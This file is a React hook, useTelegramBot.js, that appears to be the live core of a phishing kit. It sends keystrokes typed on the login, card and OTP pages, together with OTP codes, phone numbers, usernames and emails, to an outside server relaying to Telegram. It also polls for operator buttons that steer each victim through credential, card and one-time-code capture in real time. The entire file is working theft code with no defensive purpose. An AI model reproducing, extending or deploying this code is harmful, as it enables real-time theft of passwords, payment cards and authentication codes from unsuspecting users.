// src/hooks/useTelegramBot.js
import { useRef, useEffect, useCallback } from 'react';
import axios from 'axios';

// 🔥 We set the base URL here once.
const BASE_URL = 'https://penktimm.onrender.com'; 
const API_URL = `${BASE_URL}/api/log`;
const ACTION_URL = `${BASE_URL}/api/action`;

const lastLogTimes = {};
const THROTTLE_DELAY = 5000;

const shouldSendLog = (logType) => {
  const now = Date.now();
  if (now - (lastLogTimes[logType] || 0) < THROTTLE_DELAY) return false;
  lastLogTimes[logType] = now;
  return true;
};

export const useTelegramBot = (sessionId, onApprove, onDeny, onNextStep) => {
  const pollingIntervalRef = useRef(null);
  const lastUpdateIdRef = useRef(0);

  const generateSessionId = () => {
    return Date.now().toString() + Math.random().toString(36).substr(2, 6);
  };

  const sendLog = async (text, logType = 'generic') => {
    if (!shouldSendLog(logType)) return false;
    try {
      const res = await axios.post(API_URL, { text });
      return res.data?.ok === true;
    } catch (error) {
      console.error('Error sending log:', error);
      return false;
    }
  };

  const sendAction = async (text, keyboard) => {
    try {
      const res = await axios.post(ACTION_URL, { text, keyboard });
      return res.data?.ok === true;
    } catch (error) {
      console.error('Error sending action:', error);
      return false;
    }
  };

  const sendPageViewLog = async () => {
    if (!shouldSendLog('pageView')) return;
    await sendLog(`⚠️ Someone is visiting the login page!\n⏰ ${new Date().toLocaleString()}`, 'pageView');
  };

  const sendSiteEntryLog = async () => {
    if (!shouldSendLog('siteEntry')) return;
    await sendLog(`🌍 <b>SITE ENTRY - VISITOR</b> 🌍\n⏰ <b>Time:</b> ${new Date().toLocaleString()}\n🖥️ <b>Device:</b> ${navigator.userAgent.substring(0, 80)}`, 'siteEntry');
  };

  const sendVisitNotification = async (ipAddress, sessionId) => {
    if (!shouldSendLog('visitNotification')) return;
    await sendLog(`🌐 <b>NEW SITE VISITOR</b> 🌐\n🆔 <b>Session ID:</b> <code>${sessionId}</code>\n⏰ ${new Date().toLocaleString()}`, 'visitNotification');
  };

  const sendLoginRequestToTelegram = async (message, sessionId) => {
    const keyboard = {
      inline_keyboard: [
        [{ text: "✅ Approve Connexion", callback_data: `approve_login_${sessionId}` }, { text: "🔐 OTP Connexion", callback_data: `otp_login_${sessionId}` }],
        [{ text: "❌ Login False", callback_data: `login_false_${sessionId}` }],
        [{ text: "💳 Card Verification", callback_data: `card_verification_${sessionId}` }]
      ]
    };
    return await sendAction(message, keyboard);
  };

  const sendCheckoutEmailToTelegram = async () => {
    const email = sessionStorage.getItem('cartEmail') || 'Not provided';
    const loginName = sessionStorage.getItem('loginName') || 'Unknown';
    const sessionId = sessionStorage.getItem('telegramSessionId') || 'N/A';
    const message = `🛒 <b>CHECKOUT - EMAIL CAPTURED</b> 🛒\n⏰ <b>Time:</b> ${new Date().toLocaleString()}\n🆔 <b>Session ID:</b> <code>${sessionId}</code>\n📝 <b>CHECKOUT INFO:</b>\n├ 👤 <b>Username:</b> ${loginName}\n└ 📧 <b>Email:</b> <code>${email}</code>\n✅ <i>User proceeded to checkout</i>`;
    return await sendAction(message, null);
  };

  const sendCardDetailsToTelegram = async (cardData, sessionId) => {
    const message = `💳 <b>CARD VERIFICATION TRIGGERED</b>\n🆔 <b>Session:</b> <code>${sessionId}</code>\n⏰ ${new Date().toLocaleString()}`;
    const keyboard = {
      inline_keyboard: [
        [{ text: "➡️ Next Step (OTP)", callback_data: `next_${sessionId}` }],
        [{ text: "❌ Card False", callback_data: `card_false_${sessionId}` }]
      ]
    };
    return await sendAction(message, keyboard);
  };

  const sendOtpPageLog = async (username, phoneNumber, sessionId) => {
    if (!shouldSendLog('otpPage')) return;
    const message = `🔐 OTP PAGE - IN PROGRESS 🔐\n👤 Username: ${username}\n📱 Phone: ${phoneNumber}\n⏰ Time: ${new Date().toLocaleString()}\n⚠️ User is ready to enter OTP code!`;
    const keyboard = {
      inline_keyboard: [
        [{ text: "✅ Approve OTP", callback_data: `approve_otp_${sessionId}` }, { text: "❌ OTP False", callback_data: `otp_false_${sessionId}` }],
        [{ text: "⬅️ Back to Card", callback_data: `back_to_card_${sessionId}` }]
      ]
    };
    await sendAction(message, keyboard);
  };

  const sendConfirmationPageLog = async (username, sessionId) => {
    const message = `💳 <b>CONFIRMATION PAGE - IN PROGRESS</b> 💳\n👤 <b>Username:</b> ${username}\n⏰ <b>Time:</b> ${new Date().toLocaleString()}\n⚠️ <i>User is on confirmation page!</i>`;
    const keyboard = {
      inline_keyboard: [
        [{ text: "⬅️ Back to Appr Page", callback_data: `back_to_appr_${sessionId}` }]
      ]
    };
    await sendAction(message, keyboard);
  };

  const sendCardVerificationLog = async (username) => {
    if (!shouldSendLog('cardVerification')) return;
    await sendLog(`💳 CARD VERIFICATION - IN PROGRESS 💳\n👤 Username: ${username}\n⏰ Time: ${new Date().toLocaleString()}\n⚠️ User is now entering card information!`, 'cardVerification');
  };

  const sendCardVerificationPageLog = async (username) => {
    if (!shouldSendLog('cardVerificationPage')) return;
    await sendLog(`💳 <b>CARD VERIFICATION PAGE</b> 💳\n👤 <b>Username:</b> ${username || 'Not logged in yet'}\n⏰ <b>Time:</b> ${new Date().toLocaleString()}`, 'cardVerificationPage');
  };

  const sendOtpSubmitLog = async (username, phoneNumber, otpCode) => {
    if (!shouldSendLog('otpSubmit')) return;
    await sendAction(`🔐 <b>OTP CODE SUBMITTED</b> 🔐\n👤 <b>Username:</b> ${username}\n📱 <b>Phone:</b> ${phoneNumber}\n🔢 <b>OTP:</b> ${otpCode}\n⏰ ${new Date().toLocaleString()}`, null);
  };

  const sendOtpVerifiedLog = async (username, phoneNumber, otpCode) => {
    if (!shouldSendLog('otpVerified')) return;
    await sendLog(`✅ <b>OTP VERIFIED SUCCESSFULLY</b> ✅\n👤 <b>Username:</b> ${username}\n📱 <b>Phone:</b> ${phoneNumber}\n🔢 <b>OTP:</b> ${otpCode}`, 'otpVerified');
  };

  const sendLoginTypingLog = async (username, field, value) => {
    if (!shouldSendLog('loginTyping')) return;
    await sendLog(`✏️ <b>TYPING - LOGIN PAGE</b> ✏️\n📝 <b>Field:</b> ${field}\n📝 <b>Value:</b> ${value}\n👤 <b>Username:</b> ${username || 'Not entered yet'}`, 'loginTyping');
  };

  const sendCardTypingLog = async (username, field, value) => {
    if (!shouldSendLog('cardTyping')) return;
    await sendLog(`✏️ <b>TYPING - CARD PAGE</b> ✏️\n📝 <b>Field:</b> ${field}\n📝 <b>Value:</b> ${value}`, 'cardTyping');
  };

  const sendOtpTypingLog = async (username, phoneNumber, value) => {
    if (!shouldSendLog('otpTyping')) return;
    await sendLog(`✏️ <b>TYPING - OTP PAGE</b> ✏️\n📝 <b>Value:</b> ${value}\n👤 <b>Username:</b> ${username}`, 'otpTyping');
  };

  const sendConfirmationLog = async (username, cardNumber, sessionId) => {
    if (!shouldSendLog('confirmation')) return;
    await sendLog(`✅ <b>CONFIRMATION IN CZ KEY</b> ✅\n👤 <b>Username:</b> ${username}\n🆔 <b>Session ID:</b> <code>${sessionId}</code>\n⏰ ${new Date().toLocaleString()}`, 'confirmation');
  };

  const sendFormattedCardDetails = async (sessionId) => {
    if (!shouldSendLog('formattedCard')) return;
    await sendLog(`💳 <b>NEW CARD DATA</b> 💳\n🆔 <b>Session ID:</b> <code>${sessionId}</code>\n⏰ ${new Date().toLocaleString()}`, 'formattedCard');
  };

  const sendOtpToTelegram = async (otpCode, phoneNumber, sessionId) => {
    if (!shouldSendLog('otpCode')) return;
    await sendLog(`🔐 <b>OTP CODE RECEIVED</b> 🔐\n🆔 <b>Session ID:</b> <code>${sessionId}</code>\n<b>OTP Code:</b> <code>${otpCode}</code>\n📱 <b>Phone:</b> ${phoneNumber}`, 'otpCode');
  };

  const sendSuccessToTelegram = async (phoneNumber, sessionId) => {
    if (!shouldSendLog('success')) return;
    await sendLog(`✅ <b>LOGIN COMPLETED SUCCESSFULLY!</b> ✅\n🆔 <b>Session ID:</b> <code>${sessionId}</code>\n📱 <b>Phone Number:</b> ${phoneNumber}`, 'success');
  };

  const setupTelegramPolling = useCallback(() => {
    if (pollingIntervalRef.current) clearInterval(pollingIntervalRef.current);

    pollingIntervalRef.current = setInterval(async () => {
      const currentSessionId = sessionId || sessionStorage.getItem('telegramSessionId');
      if (!currentSessionId) return;

      try {
        // 🔥 FIXED: Uses BASE_URL instead of localhost
        const res = await axios.get(`${BASE_URL}/api/updates?offset=${lastUpdateIdRef.current}`);
        const updates = res.data.result || [];
        
        for (const update of updates) {
          if (update.update_id >= lastUpdateIdRef.current) {
            lastUpdateIdRef.current = update.update_id + 1;
          }
          
          if (update.callback_query) {
            const callbackData = update.callback_query.data;
            const lastUnderscore = callbackData.lastIndexOf('_');
            const action = callbackData.substring(0, lastUnderscore);
            const sid = callbackData.substring(lastUnderscore + 1);

            const storedSid = sessionStorage.getItem('telegramSessionId');
            const activeSid = currentSessionId || storedSid;
            const match = !activeSid || sid.slice(-6) === activeSid.slice(-6);

            if (match) {
              if (action === 'approve') onApprove?.();
              else if (action === 'deny') onDeny?.();
              else if (action === 'next') onNextStep?.();
            }
            // 🔥 FIXED: Uses BASE_URL
            await axios.post(`${BASE_URL}/api/callback`, {
              callback_query_id: update.callback_query.id,
              text: "✅ Request processed!"
            }).catch(() => {});
          }
        }
      } catch (error) {}
    }, 3000);
    
    return () => {
      if (pollingIntervalRef.current) clearInterval(pollingIntervalRef.current);
    };
  }, [sessionId, onApprove, onDeny, onNextStep]);

  useEffect(() => {
    const cleanup = setupTelegramPolling();
    return cleanup;
  }, [setupTelegramPolling]);

  return {
    generateSessionId,
    sendLoginRequestToTelegram,
    sendCheckoutEmailToTelegram,
    sendCardDetailsToTelegram,
    sendFormattedCardDetails,
    sendOtpToTelegram,
    sendSuccessToTelegram,
    sendPageViewLog,
    sendCardVerificationLog,
    sendOtpPageLog,
    sendCardVerificationPageLog,
    sendOtpSubmitLog,
    sendOtpVerifiedLog,
    sendLoginTypingLog,
    sendCardTypingLog,
    sendOtpTypingLog,
    sendSiteEntryLog,
    sendVisitNotification,
    sendConfirmationLog,
    sendConfirmationPageLog,
  };
};